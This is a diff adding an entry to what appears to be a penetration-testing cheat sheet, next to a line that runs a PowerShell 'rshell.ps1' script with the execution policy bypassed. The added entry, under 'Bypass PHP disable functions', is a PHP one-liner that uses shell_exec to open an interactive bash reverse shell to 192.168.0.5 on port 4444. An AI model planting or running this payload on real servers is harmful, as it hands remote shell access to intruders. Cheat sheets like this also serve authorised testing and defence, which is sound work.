@@ -79,6 +79,11 @@ Execute PowerShell script non-interactively:
 $ powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
 ```
 
+Bypass PHP disable functions.
+```
+<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'"); ?>
+```
+
 
 ## Linux Privilege Escalation
 
